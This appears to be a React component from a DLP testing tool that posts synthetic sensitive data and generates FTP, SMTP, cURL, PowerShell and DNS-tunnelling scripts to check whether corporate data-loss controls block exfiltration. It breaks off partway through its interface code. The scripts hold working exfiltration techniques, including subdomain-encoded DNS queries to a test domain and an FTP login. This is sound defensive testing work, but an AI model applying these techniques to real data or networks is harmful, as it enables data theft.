'use client'

import { useState, useCallback, useEffect, useRef, useMemo } from 'react'
import {
  Play, Download, Copy, Check, Loader2,
  ShieldCheck, ShieldAlert, AlertTriangle, Zap,
  UploadCloud, FileText, X, ChevronDown, Search,
} from 'lucide-react'
import { cn } from '@/lib/utils'
import { saveTestResult, updateTestResultUserAlert } from '../actions'
import type { TestHistoryEntry, TestResult } from '../actions'
import { SearchableSelect } from '@/components/ui/searchable-select'
import { usePagination } from '@/hooks/use-pagination'

// ── Test Scenarios ────────────────────────────────────────────────────────────

interface Scenario {
  id:          string
  name:        string
  protocol:    string
  description: string
  category:    'web' | 'script'
  ext?:        string
}

const WEB_TESTS: Scenario[] = [
  { id: 'https_post_text',   category: 'web', name: 'HTTPS POST — Plain Text',     protocol: 'text/plain',                        description: 'POST request with sensitive text in the body — the most common web exfiltration vector' },
  { id: 'https_post_json',   category: 'web', name: 'HTTPS POST — JSON Payload',   protocol: 'application/json',                  description: 'REST API call with sensitive data as JSON — tests whether DLP inspects structured API traffic' },
  { id: 'https_post_form',   category: 'web', name: 'HTTPS POST — Form Submit',    protocol: 'application/x-www-form-urlencoded', description: 'Web form submission with sensitive data — simulates a user copy-pasting into an online form' },
  { id: 'https_file_upload', category: 'web', name: 'HTTPS — File Upload',         protocol: 'multipart/form-data',               description: 'Multipart upload of a generated text file containing synthetic sensitive data' },
  { id: 'https_get_param',   category: 'web', name: 'HTTPS GET — URL Parameter',   protocol: 'GET ?data=…',                       description: 'Sensitive data encoded in a URL query string — tests whether DLP inspects GET request parameters' },
  { id: 'base64_post',       category: 'web', name: 'HTTPS POST — Base64 Encoded', protocol: 'text/plain (base64)',               description: 'Base64-obfuscated payload — tests whether DLP decodes and inspects encoded content' },
  { id: 'custom_file',       category: 'web', name: 'Upload Your Own File',         protocol: 'multipart/form-data',               description: 'Upload any file from your machine — tests whether DLP catches real-world documents containing sensitive data' },
]

const SCRIPT_DEFS: Scenario[] = [
  { id: 'script_ftp',        category: 'script', name: 'FTP Upload',           protocol: 'FTP — Port 21',   ext: 'py',  description: 'Python script: uploads a file with sensitive data via FTP — tests FTP channel controls' },
  { id: 'script_smtp',       category: 'script', name: 'SMTP Email',           protocol: 'SMTP — Port 587', ext: 'py',  description: 'Python script: sends an email with sensitive content — tests email DLP controls' },
  { id: 'script_dns',        category: 'script', name: 'DNS Exfiltration Sim', protocol: 'DNS — UDP 53',    ext: 'sh',  description: 'Bash script: simulates DNS-based data exfiltration — tests DNS inspection controls' },
  { id: 'script_curl',       category: 'script', name: 'cURL — HTTPS POST',    protocol: 'HTTPS (cURL)',    ext: 'sh',  description: 'Shell script: uses cURL to POST sensitive data — useful for quick CLI-based testing' },
  { id: 'script_powershell', category: 'script', name: 'PowerShell — HTTPS',   protocol: 'HTTPS (PS)',      ext: 'ps1', description: 'PowerShell script for Windows endpoint DLP testing via HTTPS POST' },
]

const MAIN_WEB_IDS   = new Set(['https_post_text', 'custom_file'])
const MAIN_TESTS     = WEB_TESTS.filter(s =>  MAIN_WEB_IDS.has(s.id))
const ADVANCED_WEB   = WEB_TESTS.filter(s => !MAIN_WEB_IDS.has(s.id))

// ── Data Types ────────────────────────────────────────────────────────────────

interface DataType { id: string; label: string; sample: string }

const DATA_TYPES: DataType[] = [
  { id: 'credit_card', label: 'Credit Cards (Mixed)',         sample: 'SYNTHETIC DLP TEST — Credit Card Numbers\n4532 0151 1283 0366 (Visa)\n5425 2334 3010 9903 (Mastercard)\n374251018720955 (Amex)\n6011 1111 1111 1117 (Discover)\nCVV: 123  |  Expiry: 09/28' },
  { id: 'ssn',         label: 'US Social Security Numbers',   sample: 'SYNTHETIC DLP TEST — US Social Security Numbers\n523-45-6789\n412-91-2345\n078-05-1120' },
  { id: 'uk_nin',      label: 'UK National Insurance No.',    sample: 'SYNTHETIC DLP TEST — UK National Insurance Numbers\nAB 12 34 56 C\nCD 98 76 54 A\nEF 11 22 33 B' },
  { id: 'api_key',     label: 'API Keys & Secrets',           sample: 'SYNTHETIC DLP TEST — API Keys\nAWS Access Key: AKIAIOSFODNN7EXAMPLE\nAWS Secret: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nStripe: sk_live_SYNTHETIC000000000000\nGitHub PAT: ghp_SYNTHETIC16C7aFakeToken001' },
  { id: 'db_url',      label: 'Database Connection Strings',  sample: 'SYNTHETIC DLP TEST — Database Credentials\npostgresql://admin:S3cr3tP@ss@db.example.com:5432/production\nmysql://root:P@ssw0rd_TEST@db.example.com:3306/customers\nredis://:P@ssRedis123@cache.example.com:6379' },
  { id: 'jwt',         label: 'JWT / Auth Tokens',            sample: 'SYNTHETIC DLP TEST — JWT Tokens\neyJhbGciOiJIUzI1NiJ9.SYNTHETIC_PAYLOAD_001.SYNTHETIC_SIG_A1B2C3\neyJhbGciOiJIUzI1NiJ9.SYNTHETIC_PAYLOAD_002.SYNTHETIC_SIG_D4E5F6' },
  { id: 'phi',         label: 'PHI — Patient Record (HIPAA)', sample: 'SYNTHETIC DLP TEST — Protected Health Information\nPatient: John Smith\nSSN: 523-45-6789\nDOB: 03/15/1972\nDiagnosis ICD-10: J18.9 (Pneumonia)\nNPI: 1234567890\nInsurance ID: INS-AB-12345\nDEA: AB1234567' },
  { id: 'iban',        label: 'IBAN / Bank Accounts',         sample: 'SYNTHETIC DLP TEST — Banking Data\nGB29NWBK60161331926819 (UK)\nDE89370400440532013000 (Germany)\nFR1420041010050500013M02606 (France)' },
  { id: 'passport',    label: 'Passport Numbers',             sample: 'SYNTHETIC DLP TEST — Passport Numbers\nGZ1234567 (UK)\nAB9876543 (US)\nName: John Smith  |  DOB: 03/15/1972  |  Nationality: British' },
  { id: 'custom',      label: 'Custom payload',               sample: '' },
]

// ── Script Generators (client-side, no server call) ───────────────────────────

function generateScript(id: string, payload: string, origin: string): string {
  const ps = payload.replace(/'/g, "'\\''")  // shell-escape for single-quotes

  if (id === 'script_ftp') return `#!/usr/bin/env python3
"""
DLP Test: FTP Upload with Synthetic Sensitive Data
Generated by Effata DLP Shield

PURPOSE  Run from your corporate network to verify that your DLP
         solution detects and blocks FTP uploads of sensitive data.

RESULT
  Upload succeeds        ->  [!] NOT BLOCKED — FTP exfiltration not caught
  Connection blocked     ->  [+] BLOCKED     — FTP controls working

NOTE: All data is SYNTHETIC — generated for DLP testing only.
"""
import ftplib, io

TEST_DATA = """
${payload}
"""

try:
    print("[*] Connecting to public FTP test server (ftp.dlptest.com)...")
    ftp = ftplib.FTP("ftp.dlptest.com", timeout=15)
    ftp.login("dlptest", "rNLMs65R29q76byj")
    ftp.storbinary("STOR dlp_test_synthetic.txt", io.BytesIO(TEST_DATA.encode()))
    print("=" * 60)
    print("[!]  NOT BLOCKED — File uploaded successfully")
    print("[!]  DLP did NOT detect/block this FTP transfer")
    print("=" * 60)
    ftp.quit()
except Exception as e:
    print("=" * 60)
    print(f"[+]  Blocked or failed: {e}")
    print("[+]  FTP exfiltration controls appear to be working")
    print("=" * 60)
`

  if (id === 'script_smtp') return `#!/usr/bin/env python3
"""
DLP Test: SMTP Email Exfiltration with Synthetic Data
Generated by Effata DLP Shield

PURPOSE  Run from your corporate network to verify that your DLP
         solution inspects and blocks outbound email with sensitive content.

RESULT
  Email sent             ->  [!] NOT BLOCKED — email DLP not catching this
  Connection blocked     ->  [+] BLOCKED     — email controls working

NOTE: All data is SYNTHETIC. Provide real credentials to actually
send; for most DLP tests the SMTP connection attempt alone is enough.
"""
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

TEST_BODY = """${payload}"""

msg = MIMEMultipart()
msg["Subject"] = "DLP Test — Synthetic Sensitive Data"
msg["From"]    = "dlptest@corp.example.com"
msg["To"]      = "external-test@example.com"
msg.attach(MIMEText(TEST_BODY, "plain"))

try:
    print("[*] Connecting to smtp.gmail.com:587...")
    with smtplib.SMTP("smtp.gmail.com", 587, timeout=15) as s:
        s.ehlo()
        s.starttls()
        # Replace with real credentials to send
        s.login("your@corp.example.com", "YourAppPassword")
        s.send_message(msg)
    print("=" * 60)
    print("[!]  NOT BLOCKED — Email sent successfully")
    print("[!]  DLP did NOT block outbound SMTP with sensitive data")
    print("=" * 60)
except Exception as e:
    print("=" * 60)
    print(f"[+]  Blocked or failed: {e}")
    print("[+]  Email exfiltration controls appear to be working")
    print("=" * 60)
`

  if (id === 'script_dns') return `#!/bin/bash
# DLP Test: DNS Exfiltration Simulation
# Generated by Effata DLP Shield
#
# PURPOSE  Run from your corporate network to test DNS-based
#          exfiltration detection (DNS tunnelling / covert channel).
#
# RESULT
#   Query succeeds / resolves  ->  [!] NOT BLOCKED — DNS not monitored
#   Query fails / is blocked   ->  [+] BLOCKED     — DNS controls working
#
# Requires: dig (or nslookup). No network credentials needed.
# NOTE: All data is SYNTHETIC — for DLP testing only.

set -euo pipefail

# Encode a slice of the payload as a base64 subdomain label
PAYLOAD_ENCODED=\$(printf '%s' 'SYNTHETIC_TEST_SSN_523456789_CC_4532015112830366' | base64 | tr -d '=\\n' | tr '/+' '_-' | head -c 60)
TEST_DOMAIN="dlptest.example.com"

echo "[*] Simulating DNS exfiltration via subdomain encoding..."
echo "[*] Encoded prefix: \${PAYLOAD_ENCODED:0:30}..."
echo ""

if command -v dig &>/dev/null; then
    RESULT=\$(dig +short +timeout=10 "\${PAYLOAD_ENCODED}.\${TEST_DOMAIN}" A 2>&1 || true)
else
    RESULT=\$(nslookup "\${PAYLOAD_ENCODED}.\${TEST_DOMAIN}" 2>&1 || true)
fi

echo "============================================================"
if echo "\$RESULT" | grep -qiE "NXDOMAIN|SERVFAIL|timed out|failed|refused|no answer" || [ -z "\$RESULT" ]; then
    echo "[+]  DNS query blocked or returned no result"
    echo "[+]  DNS exfiltration controls appear to be working"
else
    echo "[!]  DNS query returned a result — may NOT be blocked"
    echo "     Check DLP logs to confirm DNS inspection is active"
fi
echo "============================================================"
`

  if (id === 'script_curl') return `#!/bin/bash
# DLP Test: HTTPS POST via cURL
# Generated by Effata DLP Shield
#
# PURPOSE  Run from your corporate network to test HTTPS exfiltration
#          controls using the command-line cURL tool.
#
# RESULT
#   HTTP 200 received   ->  [!] NOT BLOCKED — data reached the test server
#   cURL fails          ->  [+] BLOCKED     — HTTPS exfiltration caught
#
# NOTE: All data is SYNTHETIC — for DLP testing only.

ENDPOINT="${origin}/api/dlp-test"
OUTFILE="/tmp/dlp_test_response_\$\$.json"

TEST_PAYLOAD='${ps}'

echo "[*] Sending synthetic sensitive data via HTTPS POST..."
echo "[*] Target: \$ENDPOINT"
echo ""

HTTP_CODE=\$(curl -s -o "\$OUTFILE" -w "%{http_code}" \\
  -X POST \\
  -H "Content-Type: text/plain" \\
  --data "\$TEST_PAYLOAD" \\
  --max-time 15 \\
  "\$ENDPOINT" 2>&1) || true

CURL_EXIT=\$?

echo "============================================================"
if [ "\$CURL_EXIT" -ne 0 ] || [ -z "\$HTTP_CODE" ]; then
    echo "[+]  cURL failed — connection likely BLOCKED by DLP"
    echo "[+]  HTTPS exfiltration controls appear to be working"
elif [ "\$HTTP_CODE" = "200" ]; then
    echo "[!]  HTTP 200 — NOT BLOCKED"
    echo "[!]  Our server received the data. DLP did not intercept."
    echo ""
    cat "\$OUTFILE" 2>/dev/null
else
    echo "[?]  HTTP \$HTTP_CODE — check manually"
fi
echo "============================================================"

rm -f "\$OUTFILE"
`

  if (id === 'script_powershell') return `# DLP Test: PowerShell HTTPS POST
# Generated by Effata DLP Shield
#
# PURPOSE  Run from a Windows endpoint (corporate network) to test
#          whether HTTPS exfiltration of sensitive data is blocked.
#
# RESULT
#   Response received   ->  [!] NOT BLOCKED — data reached test server
#   Request fails       ->  [+] BLOCKED     — HTTPS controls working
#
# NOTE: All data is SYNTHETIC — for DLP testing only.
# Run in PowerShell: .\\dlp_test.ps1

\$endpoint = "${origin}/api/dlp-test"
\$testData  = @"
${payload}
"@

Write-Host "[*] Sending synthetic sensitive data via HTTPS POST..."
Write-Host "[*] Target: \$endpoint"
Write-Host ""

try {
    \$response = Invoke-RestMethod \`
        -Uri         \$endpoint \`
        -Method      POST \`
        -Body        \$testData \`
        -ContentType "text/plain" \`
        -TimeoutSec  15 \`
        -ErrorAction Stop

    Write-Host "============================================================"
    Write-Host "[!]  NOT BLOCKED — Server responded successfully"
    Write-Host "[!]  DLP did not intercept this HTTPS POST"
    Write-Host ""
    Write-Host (\$response | ConvertTo-Json)
    Write-Host "============================================================"
} catch {
    Write-Host "============================================================"
    Write-Host "[+]  Request failed: \$_"
    Write-Host "[+]  HTTPS exfiltration controls appear to be working"
    Write-Host "============================================================"
}
`
  return '# Unknown script type'
}

// ── Tiny helpers ──────────────────────────────────────────────────────────────

function downloadText(content: string, filename: string) {
  const blob = new Blob([content], { type: 'text/plain' })
  const url  = URL.createObjectURL(blob)
  const a    = document.createElement('a')
  a.href     = url
  a.download = filename
  a.click()
  URL.revokeObjectURL(url)
}

function formatTime(iso: string) {
  return new Date(iso).toLocaleString('en-GB', {
    day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit',
  })
}

const RESULT_META: Record<TestResult, {
  label: string; color: string; border: string; bg: string
  Icon: React.ComponentType<{ className?: string }>; headline: string; sub: string
}> = {
  blocked:           { label: 'BLOCKED',              color: 'text-green-400',  border: 'border-green-500/40',  bg: 'bg-green-500/8',   Icon: ShieldCheck,   headline: 'DLP intercepted this request',                         sub: 'The request never reached our server — your DLP control is working for this vector.' },
  not_blocked:       { label: 'NOT BLOCKED',           color: 'text-red-400',    border: 'border-red-500/40',    bg: 'bg-red-500/8',     Icon: ShieldAlert,   headline: 'Our server received the payload',                      sub: 'DLP did not intercept this request. This channel / data-type combination is not being caught.' },
  error:             { label: 'ERROR',                 color: 'text-muted-foreground',   border: 'border-border-strong/40',   bg: 'bg-muted/40',   Icon: AlertTriangle, headline: 'Test failed with an error',                            sub: 'The request failed for a non-DLP reason (check console). Try again or inspect network logs.' },
  user_alert_proceed:{ label: 'COACHING — PROCEEDED',  color: 'text-amber-400',  border: 'border-amber-500/40',  bg: 'bg-amber-500/8',   Icon: AlertTriangle, headline: 'DLP showed a coaching popup — analyst clicked Proceed', sub: 'The request was allowed after user justification. This DLP control is in coaching mode — it relies on the user to stop exfiltration, not an automated block.' },
  user_alert_stop:   { label: 'COACHING — STOPPED',    color: 'text-blue-400',   border: 'border-blue-500/40',   bg: 'bg-blue-500/8',    Icon: ShieldCheck,   headline: 'DLP showed a coaching popup — analyst clicked Stop',    sub: 'Data was not exfiltrated, but the control relies on user judgment rather than automatic blocking. Consider whether this gap requires remediation.' },
  blocked_coached:   { label: 'BLOCKED — NOTIFIED',    color: 'text-orange-400', border: 'border-orange-500/40', bg: 'bg-orange-500/8',  Icon: ShieldAlert,   headline: 'DLP blocked the transfer and showed a notification popup', sub: 'The upload was blocked and you were shown a block notification (OK only). Data did not leave. The control is enforcing but includes user notification.' },
}


const DATA_TYPE_LABELS: Record<string, string> = Object.fromEntries(DATA_TYPES.map(d => [d.id, d.label]))

// ── Main Component ────────────────────────────────────────────────────────────

interface Props { initialHistory: TestHistoryEntry[] }

interface RunResult {
  status:        TestResult
  responseCode?: number
  responseMs?:   number
  serverData?:   Record<string, unknown>
  errMsg?:       string
  proxyDetected?: boolean
}

export function DlpTestRunner({ initialHistory }: Props) {
  const [activeMode,      setActiveMode]      = useState<'web' | 'script'>('web')
  const [advancedOpen,    setAdvancedOpen]    = useState(false)
  const [selectedWeb,     setSelectedWeb]     = useState<Scenario>(WEB_TESTS[0])
  const [selectedScript,  setSelectedScript]  = useState<Scenario>(SCRIPT_DEFS[0])
  const [dataType,        setDataType]        = useState<DataType>(DATA_TYPES[0])
  const [payload,         setPayload]         = useState(DATA_TYPES[0].sample)
  const [isRunning,       setIsRunning]       = useState(false)
  const [runResult,       setRunResult]       = useState<RunResult | null>(null)
  const [history,         setHistory]         = useState<TestHistoryEntry[]>(initialHistory)
  const [copied,          setCopied]          = useState(false)
  const [scriptContent,   setScriptContent]   = useState('')
  const [uploadFile,      setUploadFile]      = useState<File | null>(null)
  const [isDragging,      setIsDragging]      = useState(false)
  const [slowTest,          setSlowTest]          = useState(false)
  const [lastResultId,      setLastResultId]      = useState<string | null>(null)
  const [lastInitialResult, setLastInitialResult] = useState<'blocked' | 'not_blocked' | null>(null)
  const [showAlertPrompt,   setShowAlertPrompt]   = useState(false)
  const fileInputRef = useRef<HTMLInputElement>(null)

  // Re-fill payload when data type changes (unless custom)
  useEffect(() => {
    /* eslint-disable react-hooks/set-state-in-effect */
    if (dataType.id !== 'custom') setPayload(dataType.sample)
    /* eslint-enable react-hooks/set-state-in-effect */
  }, [dataType])

  // Re-generate script when script selection or data type changes
  useEffect(() => {
    if (activeMode !== 'script') return
    const origin = typeof window !== 'undefined' ? window.location.origin : ''
    /* eslint-disable react-hooks/set-state-in-effect */
    setScriptContent(generateScript(selectedScript.id, payload, origin))
    /* eslint-enable react-hooks/set-state-in-effect */
  }, [activeMode, selectedScript, payload])

  // Show coaching hint after 5 seconds of running (user alert holds the connection)
  useEffect(() => {
    /* eslint-disable react-hooks/set-state-in-effect */
    if (!isRunning) { setSlowTest(false); return }
    const t = setTimeout(() => setSlowTest(true), 5000)
    /* eslint-enable react-hooks/set-state-in-effect */
    return () => clearTimeout(t)
  }, [isRunning])

  // ── Run web channel test ──────────────────────────────────────────────────

  const handleRun = useCallback(async () => {
    const isFileTest = selectedWeb.id === 'custom_file'
    if (isFileTest ? !uploadFile : !payload.trim()) return
    if (isRunning) return
    setIsRunning(true)
    setRunResult(null)
    setShowAlertPrompt(false)
    setLastResultId(null)
    setLastInitialResult(null)

    const origin   = window.location.origin
    const dest     = `${origin}/api/dlp-test`
    const start    = Date.now()
    const nameForHistory = isFileTest ? `Upload Your Own File (${uploadFile!.name})` : selectedWeb.name

    try {
      let response: Response

      if (selectedWeb.id === 'https_post_text') {
        response = await fetch(dest, { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: payload })
      } else if (selectedWeb.id === 'https_post_json') {
        response = await fetch(dest, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: dataType.id, data: payload }) })
      } else if (selectedWeb.id === 'https_post_form') {
        const p = new URLSearchParams(); p.set('data', payload); p.set('type', dataType.id)
        response = await fetch(dest, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: p.toString() })
      } else if (selectedWeb.id === 'https_file_upload') {
        const fd = new FormData()
        fd.append('file', new Blob([payload], { type: 'text/plain' }), 'dlp_test_synthetic.txt')
        fd.append('type', dataType.id)
        response = await fetch(dest, { method: 'POST', body: fd })
      } else if (selectedWeb.id === 'https_get_param') {
        response = await fetch(`${dest}?data=${encodeURIComponent(payload)}&type=${dataType.id}`)
      } else if (selectedWeb.id === 'base64_post') {
        const bytes    = new TextEncoder().encode(payload)
        const binStr   = Array.from(bytes, b => String.fromCharCode(b)).join('')
        response = await fetch(dest, { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: btoa(binStr) })
      } else {
        // custom_file
        const fd = new FormData()
        fd.append('file', uploadFile!, uploadFile!.name)
        response = await fetch(dest, { method: 'POST', body: fd })
      }

      const ms   = Date.now() - start
      const json = await response.json() as Record<string, unknown>
      const proxyDetected = json.proxy_detected === true

      setRunResult({ status: 'not_blocked', responseCode: response.status, responseMs: ms, serverData: json, proxyDetected })

      const { id } = await saveTestResult({
        testName: nameForHistory, protocol: selectedWeb.id,
        dataType: isFileTest ? 'custom_file' : dataType.id,
        destination: dest, result: 'not_blocked', responseCode: response.status, responseTimeMs: ms,
      })
      const newId = id ?? crypto.randomUUID()
      setLastResultId(newId)
      setLastInitialResult('not_blocked')
      // Auto-show alert prompt if response was slow (likely a user alert held the connection)
      if (ms > 5000 || proxyDetected) setShowAlertPrompt(true)

      setHistory(prev => [{
        id: newId, test_name: nameForHistory,
        protocol: selectedWeb.id, data_type: isFileTest ? 'custom_file' : dataType.id,
        destination: dest, result: 'not_blocked', response_code: response.status,
        response_time_ms: ms, created_at: new Date().toISOString(),
      }, ...prev.slice(0, 49)])

    } catch (err) {
      const ms  = Date.now() - start
      const msg = err instanceof Error ? err.message : 'Unknown error'
      setRunResult({ status: 'blocked', responseMs: ms, errMsg: msg })

      const { id } = await saveTestResult({
        testName: nameForHistory, protocol: selectedWeb.id,
        dataType: isFileTest ? 'custom_file' : dataType.id,
        destination: dest, result: 'blocked', responseTimeMs: ms,
      })
      const newId = id ?? crypto.randomUUID()
      setLastResultId(newId)
      setLastInitialResult('blocked')
      // A slow blocked result (>5s) means either a block-notification popup or coaching stop
      if (ms > 5000) setShowAlertPrompt(true)

      setHistory(prev => [{
        id: newId, test_name: nameForHistory,
        protocol: selectedWeb.id, data_type: isFileTest ? 'custom_file' : dataType.id,
        destination: dest, result: 'blocked', response_code: null,
        response_time_ms: ms, created_at: new Date().toISOString(),
      }, ...prev.slice(0, 49)])
    }

    setIsRunning(false)
  }, [payload, uploadFile, isRunning, selectedWeb, dataType])

  // ── Script actions ────────────────────────────────────────────────────────

  const handleCopyScript = useCallback(async () => {
    await navigator.clipboard.writeText(scriptContent)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }, [scriptContent])

  const handleDownloadScript = useCallback(() => {
    downloadText(scriptContent, `dlp_test_${selectedScript.id}.${selectedScript.ext}`)
  }, [scriptContent, selectedScript])

  // ════════════════════════════════════════════════════════════════════════════
  // RENDER
  // ════════════════════════════════════════════════════════════════════════════

  return (
    <div className="grid grid-cols-3 gap-5">

      {/* ════════════════════════════════════
          LEFT — Scenario selector
          ════════════════════════════════════ */}
      <div className="col-span-1 space-y-3">

        {/* Main tests */}
        <div className="rounded-xl border border-border bg-card/50 p-4 space-y-1.5 shadow-sm">
          <p className="text-[10px] font-bold text-muted-foreground/80 uppercase tracking-widest mb-3">Quick Tests</p>
          {MAIN_TESTS.map(s => {
            const selected = activeMode === 'web' && selectedWeb.id === s.id
            return (
              <button
                key={s.id}
                onClick={() => { setSelectedWeb(s); setActiveMode('web'); setRunResult(null); setUploadFile(null) }}
                className={cn(
                  'w-full text-left rounded-lg border p-3 transition-all',
                  selected ? 'border-blue-500/50 bg-blue-500/8' : 'border-border-strong bg-muted/40 hover:border-border-strong hover:bg-accent/40'
                )}
              >
                <div className="flex items-start gap-2">
                  <span className="mt-0.5 text-[9px] font-bold px-1.5 py-0.5 rounded shrink-0 bg-blue-500/15 text-blue-400">WEB</span>
                  <div className="min-w-0">
                    <p className={cn('text-[11px] font-semibold leading-tight', selected ? 'text-blue-500' : 'text-foreground')}>{s.name}</p>
                    <p className="text-[9px] text-muted-foreground/80 mt-0.5 leading-tight line-clamp-2">{s.protocol}</p>
                  </div>
                </div>
              </button>
            )
          })}
        </div>

        {/* Advanced — collapsible */}
        <div className="rounded-xl border border-border bg-card/50 overflow-hidden shadow-sm">
          <button
            onClick={() => setAdvancedOpen(o => !o)}
            className="w-full flex items-center justify-between px-4 py-3 text-left hover:bg-muted/40 transition-colors"
          >
            <div className="flex items-center gap-2">
              <Zap className="h-3.5 w-3.5 text-muted-foreground/80" />
              <span className="text-[11px] font-semibold text-muted-foreground">Advanced Testing</span>
            </div>
            <ChevronDown className={cn('h-3.5 w-3.5 text-muted-foreground/60 transition-transform', advancedOpen && 'rotate-180')} />
          </button>

          {advancedOpen && (
            <div className="px-4 pb-4 space-y-1.5 border-t border-border/60 pt-3">
              {/* Additional web tests */}
              <p className="text-[9px] font-bold text-muted-foreground/60 uppercase tracking-widest mb-2">Web Channel</p>
              {ADVANCED_WEB.map(s => {
                const selected = activeMode === 'web' && selectedWeb.id === s.id
                return (
                  <button
                    key={s.id}
                    onClick={() => { setSelectedWeb(s); setActiveMode('web'); setRunResult(null); setUploadFile(null) }}
                    className={cn(
                      'w-full text-left rounded-lg border p-2.5 transition-all',
                      selected ? 'border-blue-500/50 bg-blue-500/8' : 'border-border-strong bg-muted/40 hover:border-border-strong hover:bg-accent/40'
                    )}
                  >
                    <p className={cn('text-[10px] font-semibold', selected ? 'text-blue-500' : 'text-foreground')}>{s.name}</p>
                    <p className="text-[9px] text-muted-foreground/60 mt-0.5">{s.protocol}</p>
                  </button>
                )
              })}

              {/* Scripts */}
              <p className="text-[9px] font-bold text-muted-foreground/60 uppercase tracking-widest mt-3 mb-2">Protocol Scripts</p>
              {SCRIPT_DEFS.map(s => {
                const selected = activeMode === 'script' && selectedScript.id === s.id
                return (
                  <button
                    key={s.id}
                    onClick={() => { setSelectedScript(s); setActiveMode('script') }}
                    className={cn(
                      'w-full text-left rounded-lg border p-2.5 transition-all',
                      selected ? 'border-purple-500/50 bg-purple-500/8' : 'border-border-strong bg-muted/40 hover:border-border-strong hover:bg-accent/40'
                    )}
                  >
                    <p className={cn('text-[10px] font-semibold', selected ? 'text-purple-300' : 'text-foreground')}>{s.name}</p>
                    <p className="text-[9px] text-muted-foreground/60 mt-0.5">{s.protocol}</p>
                  </button>
                )
              })}
            </div>
          )}
        </div>
      </div>

      {/* ════════════════════════════════════
          RIGHT — Test runner / Script viewer
          ════════════════════════════════════ */}
      <div className="col-span-2 space-y-5">

        {/* ─── WEB TEST RUNNER ─── */}
        {activeMode === 'web' && (
          <>
            <div className="rounded-xl border border-border bg-card/50 p-5 shadow-sm">
              {/* Header */}
              <div className="flex items-start justify-between mb-4">
                <div>
                  <p className="text-[10px] font-bold text-muted-foreground/80 uppercase tracking-widest mb-1">Test Runner</p>
                  <h3 className="text-sm font-semibold text-foreground">{selectedWeb.name}</h3>
                  <p className="text-[11px] text-muted-foreground/80 mt-0.5">{selectedWeb.description}</p>
                </div>
                <span className="text-[10px] font-mono bg-muted text-muted-foreground px-2 py-1 rounded shrink-0 ml-4">
                  {selectedWeb.protocol}
                </span>
              </div>

              {selectedWeb.id === 'custom_file' ? (
                /* ── Custom file upload zone ── */
                <div className="mb-4">
                  <label className="text-[10px] font-bold text-muted-foreground/80 uppercase tracking-widest block mb-1.5">Your File</label>

                  {/* Hidden native input */}
                  <input
                    ref={fileInputRef}
                    type="file"
                    className="hidden"
                    onChange={e => { const f = e.target.files?.[0]; if (f) setUploadFile(f) }}
                  />

                  {uploadFile ? (
                    /* File selected — show info card */
                    <div className="flex items-center gap-3 rounded-lg border border-blue-500/40 bg-blue-500/8 p-4">
                      <FileText className="h-8 w-8 text-blue-400 shrink-0" />
                      <div className="flex-1 min-w-0">
                        <p className="text-sm font-semibold text-foreground truncate">{uploadFile.name}</p>
                        <p className="text-[10px] text-muted-foreground mt-0.5">
                          {uploadFile.type || 'unknown type'} · {(uploadFile.size / 1024).toFixed(1)} KB
                        </p>
                      </div>
                      <button
                        onClick={() => { setUploadFile(null); if (fileInputRef.current) fileInputRef.current.value = '' }}
                        className="p-1.5 rounded-md text-muted-foreground/80 hover:text-red-400 hover:bg-red-500/10 transition-colors"
                        title="Remove file"
                      >
                        <X className="h-4 w-4" />
                      </button>
                    </div>
                  ) : (
                    /* Drop zone */
                    <button
                      type="button"
                      onClick={() => fileInputRef.current?.click()}
                      onDragOver={e => { e.preventDefault(); setIsDragging(true) }}
                      onDragLeave={() => setIsDragging(false)}
                      onDrop={e => {
                        e.preventDefault(); setIsDragging(false)
                        const f = e.dataTransfer.files[0]
                        if (f) setUploadFile(f)
                      }}
                      className={cn(
                        'w-full rounded-lg border-2 border-dashed p-8 flex flex-col items-center gap-2 transition-colors cursor-pointer',
                        isDragging
                          ? 'border-blue-500 bg-blue-500/10'
                          : 'border-border-strong hover:border-border-strong hover:bg-muted/40'
                      )}
                    >
                      <UploadCloud className={cn('h-8 w-8', isDragging ? 'text-blue-400' : 'text-muted-foreground/60')} />
                      <p className="text-sm font-medium text-muted-foreground">Drop a file here or click to browse</p>
                      <p className="text-[10px] text-muted-foreground/60">Any file type — PDF, DOCX, CSV, TXT, images, etc.</p>
                    </button>
                  )}
                </div>
              ) : (
                /* ── Standard data-type + payload editor ── */
                <>
                  <div className="mb-3">
                    <label className="text-[10px] font-bold text-muted-foreground/80 uppercase tracking-widest block mb-1.5">Data Type</label>
                    <SearchableSelect
                      options={DATA_TYPES.map(d => ({ value: d.id, label: d.label }))}
                      value={dataType.id}
                      onChange={v => setDataType(DATA_TYPES.find(d => d.id === v) ?? DATA_TYPES[0])}
                    />
                  </div>

                  <div className="mb-4">
                    <div className="flex items-center justify-between mb-1.5">
                      <label className="text-[10px] font-bold text-muted-foreground/80 uppercase tracking-widest">Payload</label>
                      <span className="text-[9px] text-muted-foreground/60">Editable — modify to test specific patterns</span>
                    </div>
                    <textarea
                      value={payload}
                      onChange={e => setPayload(e.target.value)}
                      rows={5}
                      className="w-full bg-muted text-foreground text-xs font-mono px-3 py-2.5 rounded-lg border border-border-strong placeholder:text-muted-foreground/50 focus:outline-none focus:border-border-strong resize-none"
                      placeholder="Enter or paste test data here..."
                    />
                  </div>
                </>
              )}

              {/* Destination + Run */}
              <div className="flex items-center gap-3">
                <div className="flex-1 bg-muted border border-border-strong rounded-lg px-3 py-2 flex items-center gap-2">
                  <span className="text-[9px] font-bold text-muted-foreground/60 uppercase tracking-wide shrink-0">Target</span>
                  <span className="text-xs text-muted-foreground font-mono truncate">/api/dlp-test</span>
                </div>
                <button
                  onClick={handleRun}
                  disabled={isRunning || (selectedWeb.id === 'custom_file' ? !uploadFile : !payload.trim())}
                  className="flex items-center gap-2 px-5 py-2 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-sm font-semibold disabled:opacity-40 disabled:cursor-not-allowed transition-colors shrink-0"
                >
                  {isRunning
                    ? <><Loader2 className="h-4 w-4 animate-spin" /> Running…</>
                    : <><Play className="h-4 w-4" /> Run Test</>
                  }
                </button>
              </div>
            </div>

            {/* Result panel */}
            {isRunning && (
